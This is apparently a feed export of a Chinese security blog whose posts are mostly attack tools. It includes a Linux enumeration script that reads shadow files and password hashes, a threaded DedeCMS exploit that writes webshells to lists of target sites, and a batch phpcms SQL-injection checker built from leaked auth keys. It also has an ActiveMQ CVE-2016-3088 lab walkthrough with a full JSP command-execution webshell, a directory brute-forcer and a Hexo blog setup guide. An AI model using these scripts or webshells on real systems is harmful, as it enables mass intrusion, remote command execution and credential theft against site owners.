/,&quot;&quot;)}1&quot;&quot;&quot;,&apos;ifconfig&apos;]shuomin=[&apos;内核(是否为x64还是x86)&apos;,&apos;版本&apos;,&apos;主机名&apos;,&apos;hosts&apos;,&apos;目前登录系统的用户信息&apos;,&apos;获取用户名&apos;,&apos;获取用户组&apos;,&apos;获取hash&apos;,&apos;列出超级用户&apos;,&apos;查看用户操作&apos;,&apos;获取在线用户&apos;,&apos;端口&apos;,&apos;进程&apos;,&apos;程序&apos;,&apos;敏感文件&apos;,&apos;交互通信的ip&apos;,&apos;arp缓存&apos;,&apos;基础内核信息&apos;,&apos;主机名&apos;,&apos;最后用户登录的信息&apos;,&apos;列出所有用户的组&apos;,&apos;查询是否有hash存储在/etc/passwd(*nix中)&apos;,&apos;根据uid列出本地用户&apos;,&apos;读取shadow文件&apos;,&apos;bsd的shadow文件&apos;,&apos;能够sudo不需要提供密码&apos;,&apos;检查root目录是否存在&apos;,&apos;显示home目录情况&apos;,&apos;寻找文件我们能写但是不属于我们的文件&apos;,&apos;寻找ssh公钥&apos;,&apos;root是否能登录ssh,如果返回yes则可以登录&apos;,&apos;环境变量&apos;,&apos;列出能用的shells&apos;,&apos;hash的密码加密政策&apos;,&apos;所有的计划任务配置文件&apos;,&apos;获取计划任务内容&apos;,&apos;获取每个用户的计划任务&apos;,&apos;dns设置&apos;,&apos;路由配置&apos;,&apos;正在监听的tcp端口&apos;,&apos;udp端口&apos;,&apos;正在运行的程序&apos;,&apos;查看进程路径和权限&apos;,&apos;获取inetd.conf文件(监视网络的守护进程)&apos;,&apos;列举各种服务的管理脚本&apos;,&apos;寻找不是root的&apos;,&apos;获取mysql版本&apos;,&apos;获取sudo版本&apos;,&apos;测试root/root能否登录&apos;,&apos;postgres版本&apos;,&apos;apache详情&apos;,&apos;apache的运行用户&apos;,&apos;ip&apos;]def poc():    xk = open(&apos;save.txt&apos;, &apos;w&apos;)    xk.close()    for i in range(0,len(ml)):        zx=os.popen(ml[i])        print(&apos;[+]{}&apos;.format(shuomin[i]))        print(&apos;[+]{}&apos;.format(shuomin[i]),file=open(&apos;save.txt&apos;,&apos;a&apos;))        for z in zx:            print(z,file=open(&apos;save.txt&apos;,&apos;a&apos;))poc()</code></pre><p>收集结果如下：<br><img src="https://i.imgur.com/F4QC5Cs.png" alt=""></p><p><img src="https://i.imgur.com/ap7NSAR.png" alt=""></p><p><img src="https://i.imgur.com/rNcTlqi.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>dedecms远程文件写入漏洞检测</title>
      <link href="/2018/07/31/dedecms%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/"/>
      <url>/2018/07/31/dedecms%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Dedecms远程文件写入漏洞。出现于/install/index.php.bak这个文件<br>详细情况请看：<a href="http://www.k2a.cn/131.html" target="_blank" rel="noopener">http://www.k2a.cn/131.html</a></p><p><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=1906298132,553206994&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p><strong>思路：</strong></p><pre><code>1.先发送请求 /install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php 进行清空2.构造shell进行写入请求3.验证shell是否存在</code></pre><p>一开始我直接判断是否防火墙之类的东西，导致后面没有办法成功。所以<br>我这里就没有些判断什么防火墙的东西。直接判断shell有没有写入成功</p><p>代码：</p><pre><code>import requestsimport osimport threadingpayload=[&apos;/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/xx.php&amp;updateHost=http://your-IP/&apos;,&apos;/data/xx.php&apos;,&apos;shell的特征&apos;]user=input(&apos;file:&apos;)if os.path.exists(user): //判断文件是否存在    print(&apos;[+]open {} ok !&apos;.format(user))else:    print(&apos;[-]Not found {}&apos;.format(user))    exit()def explot(urls):    headers = {&apos;user-agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;}    url1=&quot;{}&quot;.format(urls+payload[0]).strip() //构造URL     url2=&quot;{}&quot;.format(urls+payload[1]).strip()    gjz=payload[2]    try:        rw=requests.get(url=&apos;{}/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php &apos;.format(urls),headers=headers) //发送请求进行清空        rqt=requests.get(url=url1,headers=headers)  //远程写入        rqt2=requests.get(url=url2,headers=headers)         if gjz in rqt2.text or gjz in rqt2.content.decode(&apos;utf-8&apos;): //判断是否成功写入shell            print(&apos;[+]shell url:{}&apos;.format(rqt2.url)            print(&apos;[+]shell url:{}&apos;.format(rqt2.url),file=open(&apos;good.txt&apos;,&apos;a&apos;))        else:            print(&apos;[-]no shell {}&apos;.format(rqt2.url))    except:        passif __name__ == &apos;__main__&apos;:    dk=open(&apos;{}&apos;.format(user),&apos;r&apos;)    for r in dk.readlines():        qc=&quot;&quot;.join(r.split(&apos;\n&apos;))        t=threading.Thread(target=explot,args=(qc,))        t.start()</code></pre><p>测试结果:<br><img src="https://i.imgur.com/qvZeGSc.png" alt=""></p><p><img src="https://i.imgur.com/f3AJ3tb.png" alt=""></p><p>转载请注明：出自422926799.Github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>phpcmssqllin</title>
      <link href="/2018/07/28/phpcmssqllin/"/>
      <url>/2018/07/28/phpcmssqllin/</url>
      <content type="html"><![CDATA[<h1 id="phpcms-auth-key注入漏洞批量检测"><a href="#phpcms-auth-key注入漏洞批量检测" class="headerlink" title="phpcms auth_key注入漏洞批量检测"></a>phpcms auth_key注入漏洞批量检测</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>一位基友问我能不能写批检，然后就写了。这个漏洞主要是因为auth_key泄露造成的sql注入漏洞。中专检测的php网上已经有了<br>我们只需要写个批量检测就行了。</p><p><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2127804709,2109998066&amp;fm=27&amp;gp=0.jpg" alt=""></p><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><pre><code>1.首先你得了解这个漏洞为什么会发生？我该怎么去利用？详细请看这篇文章：https://www.waitalone.cn/phpcmsv9-authkey-sql.html2.居然已经给出了PHP的中专检测脚本，我们只需要批量替换掉php检测脚本的URL和key。然后生成新的修改好的PHP文件放入一个目录即可3.然后把生成的目录放入你的PHP环境，进行读取该路径下的所有PHP文件名。然后发送请求判断返回结果是0还是-1即可。（0代表无漏洞，-1代表有漏洞）</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>jsqllin.py</p><pre><code>import requestsimport osimport rekeys=[]#if os.path.exists(&apos;v9.php&apos;): #   print(&apos;[+]ok v9.php&apos;)##  print(&apos;[-]not found v9.php&apos;)  #  exit()xs=open(&apos;saveurl.txt&apos;,&apos;w&apos;)xs.close()print(&apos;[+]Write url&apos;)dw=open(&apos;phpv9_key_leak.txt&apos;,&apos;r&apos;)for j in dw.readlines():    ldw=&quot;&quot;.join(j.split(&apos;\n&apos;))    qe = re.finditer(&apos;(http|https)://(www.)?(\w+(\.)?)+&apos;, ldw) //正则提取出URL    for q in qe:        rc = re.findall(&quot;[a-zA-z]+://[^\s]*&quot;, str(q))        for j in rc:            we = &quot;{}&quot;.format(j).replace(&apos;&gt;&apos;, &apos;&apos;).replace(&quot;&apos;&quot;, &apos;&apos;)            print(we,file=open(&apos;saveurl.txt&apos;,&apos;a&apos;))wc=[]lo=open(&apos;keys.txt&apos;,&apos;w&apos;)lo.close()dkv=open(&apos;phpv9_key_leak.txt&apos;,&apos;r&apos;)for r in dkv.readlines():    wq=&quot;&quot;.join(r.split(&apos;\n&apos;))    qe=re.sub(&apos;(http|https)://(www.)?(\w+(\.)?)+&apos;,&apos;&apos;,wq)    qc=re.sub(&apos;\|&apos;,&apos;&apos;,str(qe))    tx=re.findall(&apos;[a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9]&apos;,str(qc)) //正则提取出key    for k in tx:        print(k,file=open(&apos;keys.txt&apos;,&apos;a&apos;))pds2=[]wqe2=[]pds=open(&apos;saveurl.txt&apos;,&apos;r&apos;)wqe=open(&apos;keys.txt&apos;,&apos;r&apos;)for b in pds.readlines():    pds2.append(&quot;&quot;.join(b.split(&apos;\n&apos;)))for w in wqe.readlines():    wqe2.append(&quot;&quot;.join(w.split(&apos;\n&apos;)))for x in range(int(len(pds2))): //读取pds（key列表里面的长度）生成对应数量的PHP文件    os.mknod(&apos;scv/{}v9.php&apos;.format(x))dr=os.listdir(&apos;scv&apos;) //读取scv目录下所有的PHP文件for d in range(0,len(pds2)):    print(&quot;&quot;&quot;&lt;?phpset_time_limit(0);$wang_url = &apos;{}&apos;; &quot;&quot;&quot;.format(pds2[d])+&quot;&quot;&quot; $auth_key = &apos;{}&apos;;&quot;&quot;&quot;.format(wqe2[d])+&quot;&quot;&quot; $str = &quot;uid=1&quot; . stripslashes($_GET[&apos;id&apos;]);$encode = sys_auth($str, &apos;ENCODE&apos;, $auth_key);$content = file_get_contents($wang_url . &quot;/phpsso_server/?m=phpsso&amp;c=index&amp;a=getuserinfo&amp;appid=1&amp;data=&quot; . $encode);echo $content;function sys_auth($string, $operation = &apos;ENCODE&apos;, $key = &apos;&apos;, $expiry = 0){    $key_length = 4;    $key = md5($key);    $fixedkey = hash(&apos;md5&apos;, $key);    $egiskeys = md5(substr($fixedkey, 16, 16));    $runtokey = $key_length ? ($operation == &apos;ENCODE&apos; ? substr(hash(&apos;md5&apos;, microtime(true)), -$key_length) : substr($string, 0, $key_length)) : &apos;&apos;;    $keys = hash(&apos;md5&apos;, substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));    $string = $operation == &apos;ENCODE&apos; ? sprintf(&apos;%010d&apos;, $expiry ? $expiry + time() : 0) . substr(md5($string . $egiskeys), 0, 16) . $string : base64_decode(substr($string, $key_length));    $i = 0;    $result = &apos;&apos;;    $string_length = strlen($string);    for ($i = 0; $i &lt; $string_length; $i++) {        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));    }    if ($operation == &apos;ENCODE&apos;) {        return $runtokey . str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));    } else {        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $egiskeys), 0, 16)) {            return substr($result, 26);        } else {            return &apos;&apos;;        }    }}?&gt;    &quot;&quot;&quot;,file=open(&apos;scv/{}&apos;.format(dr[d]),&apos;a&apos;)) //这个公司会将修改好的逐个写入</code></pre><p>jiances.py</p><pre><code>import requestsimport osprint(&apos;[!]请确保你把生成的php文件夹拷贝到你的php环境目录之下，然后请输入目录的路径。我将获取路径下所有的文件进行检测&apos;)user=input(&apos;path:&apos;)xj=open(&apos;save.txt&apos;,&apos;w&apos;)xj.close()def exploitsqllin():    cs=os.listdir(user) //读取指定列表下的所有文件    headers={&apos;user-gent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;}    for s in cs: //遍历        print(s,file=open(&apos;save.txt&apos;,&apos;a&apos;)) //写入txt    dk=open(&apos;save.txt&apos;,&apos;r&apos;)     for r in dk.readlines():        wed=&quot;&quot;.join(r.split(&apos;\n&apos;))        urls=&apos;http://127.0.0.1/scv/{}?id=1&apos;.format(wed) //遍历txt之后构造URL        rq=requests.get(url=urls,headers=headers) //发送请求进行判断        if &apos;0&apos; in rq.text:             print(&apos;[-]Not bug {}&apos;.format(rq.url))        elif &apos;-1&apos; in rq.text:            print(&apos;[+]Bug url {}&apos;.format(rq.url))exploitsqllin()</code></pre><p>图片：</p><p>生成的php<br><img src="https://i.imgur.com/bP9cbAG.png" alt=""></p><p><img src="https://i.imgur.com/9490Rej.png" alt=""></p><p>检测结果：<br><img src="https://i.imgur.com/2EyNcfM.png" alt=""></p><p><img src="https://i.imgur.com/939Jan6.png" alt=""></p><p>漏洞几率不是很大</p><pre><code>[-]Not bug http://127.0.0.1/scv/79v9.php?id=1[-]Not bug http://127.0.0.1/scv/66v9.php?id=1[-]Not bug http://127.0.0.1/scv/2v9.php?id=1[+]Bug url http://127.0.0.1/scv/45v9.php?id=1[-]Not bug http://127.0.0.1/scv/47v9.php?id=1[-]Not bug http://127.0.0.1/scv/74v9.php?id=1[-]Not bug http://127.0.0.1/scv/91v9.php?id=1[-]Not bug http://127.0.0.1/scv/90v9.php?id=1[-]Not bug http://127.0.0.1/scv/88v9.php?id=1[-]Not bug http://127.0.0.1/scv/57v9.php?id=1[+]Bug url http://127.0.0.1/scv/89v9.php?id=1[-]Not bug http://127.0.0.1/scv/78v9.php?id=1[-]Not bug http://127.0.0.1/scv/14v9.php?id=1[-]Not bug http://127.0.0.1/scv/5v9.php?id=1[-]Not bug http://127.0.0.1/scv/15v9.php?id=1[-]Not bug http://127.0.0.1/scv/63v9.php?id=1[-]Not bug http://127.0.0.1/scv/76v9.php?id=1[-]Not bug http://127.0.0.1/scv/87v9.php?id=1[+]Bug url http://127.0.0.1/scv/26v9.php?id=1[-]Not bug http://127.0.0.1/scv/72v9.php?id=1[+]Bug url http://127.0.0.1/scv/43v9.php?id=1[-]Not bug http://127.0.0.1/scv/84v9.php?id=1[-]Not bug http://127.0.0.1/scv/25v9.php?id=1[+]Bug url http://127.0.0.1/scv/92v9.php?id=1[-]Not bug http://127.0.0.1/scv/13v9.php?id=1[-]Not bug http://127.0.0.1/scv/71v9.php?id=1[-]Not bug http://127.0.0.1/scv/75v9.php?id=1[-]Not bug http://127.0.0.1/scv/56v9.php?id=1[-]Not bug http://127.0.0.1/scv/19v9.php?id=1[+]Bug url http://127.0.0.1/scv/50v9.php?id=1[-]Not bug http://127.0.0.1/scv/31v9.php?id=1[-]Not bug http://127.0.0.1/scv/41v9.php?id=1[-]Not bug http://127.0.0.1/scv/53v9.php?id=1[-]Not bug http://127.0.0.1/scv/37v9.php?id=1[-]Not bug http://127.0.0.1/scv/44v9.php?id=1[-]Not bug http://127.0.0.1/scv/85v9.php?id=1[-]Not bug http://127.0.0.1/scv/42v9.php?id=1[+]Bug url http://127.0.0.1/scv/52v9.php?id=1[+]Bug url http://127.0.0.1/scv/17v9.php?id=1[-]Not bug http://127.0.0.1/scv/64v9.php?id=1[-]Not bug http://127.0.0.1/scv/80v9.php?id=1[-]Not bug http://127.0.0.1/scv/3v9.php?id=1[-]Not bug http://127.0.0.1/scv/4v9.php?id=1[-]Not bug http://127.0.0.1/scv/58v9.php?id=1[-]Not bug http://127.0.0.1/scv/68v9.php?id=1[-]Not bug http://127.0.0.1/scv/48v9.php?id=1[-]Not bug http://127.0.0.1/scv/20v9.php?id=1[+]Bug url http://127.0.0.1/scv/38v9.php?id=1[-]Not bug http://127.0.0.1/scv/62v9.php?id=1[-]Not bug http://127.0.0.1/scv/29v9.php?id=1[-]Not bug http://127.0.0.1/scv/24v9.php?id=1[-]Not bug http://127.0.0.1/scv/32v9.php?id=1[-]Not bug http://127.0.0.1/scv/61v9.php?id=1[-]Not bug http://127.0.0.1/scv/86v9.php?id=1[-]Not bug http://127.0.0.1/scv/46v9.php?id=1[-]Not bug http://127.0.0.1/scv/33v9.php?id=1[-]Not bug http://127.0.0.1/scv/39v9.php?id=1[-]Not bug http://127.0.0.1/scv/1v9.php?id=1[-]Not bug http://127.0.0.1/scv/51v9.php?id=1[-]Not bug http://127.0.0.1/scv/93v9.php?id=1[-]Not bug http://127.0.0.1/scv/36v9.php?id=1[-]Not bug http://127.0.0.1/scv/81v9.php?id=1[-]Not bug http://127.0.0.1/scv/83v9.php?id=1[-]Not bug http://127.0.0.1/scv/27v9.php?id=1[-]Not bug http://127.0.0.1/scv/55v9.php?id=1[-]Not bug http://127.0.0.1/scv/23v9.php?id=1[-]Not bug http://127.0.0.1/scv/12v9.php?id=1[-]Not bug http://127.0.0.1/scv/95v9.php?id=1[-]Not bug http://127.0.0.1/scv/40v9.php?id=1[-]Not bug http://127.0.0.1/scv/0v9.php?id=1[-]Not bug http://127.0.0.1/scv/77v9.php?id=1[-]Not bug http://127.0.0.1/scv/35v9.php?id=1[-]Not bug http://127.0.0.1/scv/73v9.php?id=1[-]Not bug http://127.0.0.1/scv/21v9.php?id=1[-]Not bug http://127.0.0.1/scv/18v9.php?id=1[-]Not bug http://127.0.0.1/scv/65v9.php?id=1[-]Not bug http://127.0.0.1/scv/16v9.php?id=1[-]Not bug http://127.0.0.1/scv/34v9.php?id=1[-]Not bug http://127.0.0.1/scv/59v9.php?id=1[+]Bug url http://127.0.0.1/scv/94v9.php?id=1[-]Not bug http://127.0.0.1/scv/10v9.php?id=1[-]Not bug http://127.0.0.1/scv/22v9.php?id=1</code></pre><p>转载请声明：来之九世的博客</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</title>
      <link href="/2018/07/25/%E5%A4%8D%E7%8E%B0ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/"/>
      <url>/2018/07/25/%E5%A4%8D%E7%8E%B0ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>学习完Rust的Vector，想着复现一下Vulhub里面的漏洞。然后就踩到了一个坑了。= =简直MMP，原本是想着写CVE-2015-5254的复现的。可复现方法不能用了。所以emmmm….<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=886494489,586744998&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>首先我们要搭建Vulhub的环境：</p><pre><code>Vulhub漏靶场搭建方法：vulhub官网：http://vulhub.org/#/docs/download-vulhub/1.安装docker，windows自己去官网下。Linux执行：sudo apt-get install docker.io2.安装python和pip:sudo apt-get install python和suao apt-get install python-pip3.安装docker-compose:pip install docker-compose4.下载Vulhub：git clone https://github.com/vulhub/vulhub.git安装好之后进入对应的漏洞文件执行：docker-compose up -d如果出现：Couldn&apos;t connect to Docker daemon at http+xxx的问题有三个解决的方法：1.将当前的用户加入dokcer用户组 sudo usermod -aG docker &lt;Username&gt;2.在使用docker-compose附加上sudo sudo docker-compose up -d3.设置DOCKER_HOST这一个环境变量 export DOCKER_HOST=tcp://loaclhost:4243 设置完成后重新启动docker</code></pre><p>漏洞介绍：</p><pre><code>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：其使用率并不高文件操作容易出现漏洞所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</code></pre><p>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p><p>这里我的是CVE-2016-3088,所以我们要进入对应的目录：</p><pre><code>cd /vulhub/activemq/CVE-2016-3088 </code></pre><p><img src="https://i.imgur.com/VZ5imMu.png" alt=""></p><pre><code>然后执行docker-compose -build 下载漏洞环境然后在执行docker-compose up -d 启动</code></pre><p>之后我们打开浏览器访问：</p><pre><code>http://127.0.0.1:8161</code></pre><p>我们可以看到如下图所示：</p><p><img src="https://i.imgur.com/uoF1A1z.png" alt=""></p><p>这个任意文件写入漏洞得要先知道WEB路径。所以我们得登陆后台<br>默认用户名和密码是：admin/admin，登陆进去后我们要访问</p><pre><code>http://your-ip:8161/admin/test/systemProperties.jsp</code></pre><p>查看ActiveMQ的绝对路径</p><p><img src="https://i.imgur.com/LpIcgNx.png" alt=""></p><p>绝对路径为：</p><pre><code>/opt/activemq</code></pre><p>知道绝对路径之后，我们要进行文件上传。<br><img src="https://i.imgur.com/MyFt8se.png" alt=""></p><p>注：这里的shell2.txt为shell代码<br>shell代码如下：</p><pre><code>&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt; &lt;% %&gt; &lt;HTML&gt;&lt;BODY&gt; &lt;FORM METHOD=&quot;GET&quot; NAME=&quot;comments&quot; ACTION=&quot;&quot;&gt;&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;comment&quot;&gt; &lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt; &lt;/FORM&gt; &lt;pre&gt; &lt;% if ( request.getParameter( &quot;comment&quot; ) != null ) {     out.println( &quot;Command: &quot; + request.getParameter( &quot;comment&quot; ) + &quot;&lt;BR&gt;&quot; );     Process p        = Runtime.getRuntime().exec( request.getParameter( &quot;comment&quot; ) );     OutputStream os    = p.getOutputStream();     InputStream in        = p.getInputStream();     DataInputStream dis    = new DataInputStream( in );     String disr        = dis.readLine();     while ( disr != null )     {         out.println( disr ); disr = dis.readLine();     } } %&gt; &lt;/pre&gt;  &lt;/BODY&gt;&lt;/HTML&gt;</code></pre><p>代码来自：<a href="https://github.com/JoyChou93/webshell/blob/master/jsp/cmd.jsp" title="JSP shell" target="_blank" rel="noopener">https://github.com/JoyChou93/webshell/blob/master/jsp/cmd.jsp</a></p><p>上传：<br><img src="https://i.imgur.com/dSa5cgB.png" alt=""></p><p>HTTP状态码为204，即为上传成功</p><p>然后听过MOVE进行改名为jsp<br><img src="https://i.imgur.com/YdINGV6.png" alt=""></p><p>然后我们访问<a href="http://127.0.0.1:8161/api,就可以看到我们上传的shell文件" target="_blank" rel="noopener">http://127.0.0.1:8161/api,就可以看到我们上传的shell文件</a></p><p><img src="https://i.imgur.com/asEAY27.png" alt=""></p><p>执行命令如下：<br><img src="https://i.imgur.com/AI0RAO3.png" alt=""></p><p>ActiveMQ更多漏洞：<a href="http://www.freebuf.com/column/161188.html" title="更多漏洞" target="_blank" rel="noopener">http://www.freebuf.com/column/161188.html</a></p><p>转载请声明：来之422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python扫描web路径小工具</title>
      <link href="/2018/07/25/python%E6%89%AB%E6%8F%8Fweb%E8%B7%AF%E5%BE%84%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
      <url>/2018/07/25/python%E6%89%AB%E6%8F%8Fweb%E8%B7%AF%E5%BE%84%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>今天逛朋友圈的时候。发现了车王说，用python写web路径扫描的小伙伴门用head别用get。<br>后来我去百度了查了一下发现Head和Get的不同之处。所以有了以下这篇文章。<br></p><h1 id="请求对比："><a href="#请求对比：" class="headerlink" title="请求对比："></a>请求对比：</h1><p>GET：使用GET请求某个路径获取返回的响应。请求参数会暴露在外<br><br>HEAD：特别适用在优先的速度和带宽下 <br><br>1.检查资源的有效性。 <br><br>2.检查超链接的有效性。 <br><br>3.检查网页是否被串改。 <br><br>4.多用于自动搜索机器人获取网页的标志信息，获取rss种子信息，或者传递安全认证信息等。 <br><br><img src="https://i.imgur.com/EM4AYjv.png" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>思路：让使用者可以调用指定的web字典进行扫描，添加过滤信息。<br>当返回的URL的状态码为200并且无过滤列表里面关键字则判定为存在该路径。</p><p><strong>代码：</strong></p><pre><code>import requestsimport osurlw=[]okurl=[]noturl=[]error=[&apos;404&apos;,&apos;Not Found&apos;,&apos;403&apos;,&apos;找不到&apos;,&apos;没有权限&apos;,&apos;360&apos;,&apos;云锁&apos;,&apos;网站防火墙&apos;,&apos;D盾&apos;,&apos;百度云加速&apos;] //过滤列表headers={&apos;user-agent&apos;:&apos;Opera/9.80(WindowsNT6.1;U;en)Presto/2.8.131Version/11.11&apos;}ld=os.listdir(&apos;dict&apos;)print(&apos;[+]Discovery directory&apos;)for l in ld:    print(&apos;[+]find&apos;,l)print(&apos;&apos;)user=input(&apos;Please choose:&apos;)user2=input(&apos;Enter your URL:&apos;)if os.path.exists(&apos;dict/{}&apos;.format(user)):    print(&apos;[+]File existence {}&apos;.format(user))else:    print(&apos;[-]file does not exist {}&apos;.format(user))    exit()ope=open(&apos;dict/{}&apos;.format(user),&apos;r&apos;)for r in ope.readlines():    url=user2.strip()+&quot;&quot;.join(r.split(&apos;\n&apos;))    urlw.append(url)def ether(urls):    try:        reqt=requests.head(url=urls,headers=headers,allow_redirects=True)        for e in error:            if reqt.status_code==200 and e not in reqt.text: //判断                yes=&apos;[200]=&gt;Discovery path:{}&apos;.format(reqt.url)                if yes in okurl:continue //去重                okurl.append(yes)                print(yes)            else:                no=&apos;[{}]=&gt;Can t find:{}&apos;.format(reqt.status_code,reqt.url)                if no in noturl:continue //去重                noturl.append(no)                print(no)    except Exception as g:        print(&apos;[-]Error in {} url:{}&apos;.format(g,reqt.url))for w in urlw:    ether(w)</code></pre><p><strong>测试效果：</strong><br><img src="https://i.imgur.com/eAIMARt.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>用Github+Hexo搭建一个属于自己的博客</title>
      <link href="/2018/07/24/%E7%94%A8Github-Hexo%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
      <url>/2018/07/24/%E7%94%A8Github-Hexo%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>在博客园写的博文和别人用github+hexo搭建起来的对比。感觉别人的好高大上= =，然后昨天晚上黑哥也在搞看的我也想搞。就有了以下的故事<br>虽然之前按照车王的方法失败了一次，但是还是死心不改在试一次，后面成功了。<br><br>我的环境：OS:Ubuntu<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=257909425,2915417066&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><hr><p>首先你得拥有一个属于你的Github账号，如果没有就去注册<br><br>Github官网：<a href="https://github.com" target="_blank" rel="noopener">https://github.com</a></p><p>注册好之后，去新建一个项目。为<username>github.io,必须是你的username。否则会有很多的麻烦<br></username></p><p><img src="https://i.imgur.com/LkZquwd.png" alt=""></p><p>然后你在你电脑里面安装Git,nodejs,hexo,npm<br></p><ol><li>windows安装Git：<a href="https://git-scm.com/" target="_blank" rel="noopener">https://git-scm.com/</a> Git官网自行下载安装<br></li><li>Linux下安装： sudo apt-get install git<br></li><li>windows安装nodejs：<a href="https://www.cnblogs.com/hackyo/p/8110951.html" target="_blank" rel="noopener">https://www.cnblogs.com/hackyo/p/8110951.html</a> //安装nodejs教程和npm教程<br></li><li>Linux下安装nodejs：<a href="https://blog.csdn.net/u014361775/article/details/78865582" target="_blank" rel="noopener">https://blog.csdn.net/u014361775/article/details/78865582</a> //安装nodejs和npm教程<br></li><li>安装hexo：npm i -g hexo<br></li><li>查看hexo是否安装成功：hexo -v<br></li><li>hexo初始化：hexo init<br><br>初始化之后你的目录下会出现以下文件夹：<br><br><img src="https://i.imgur.com/YsKwGqW.png" 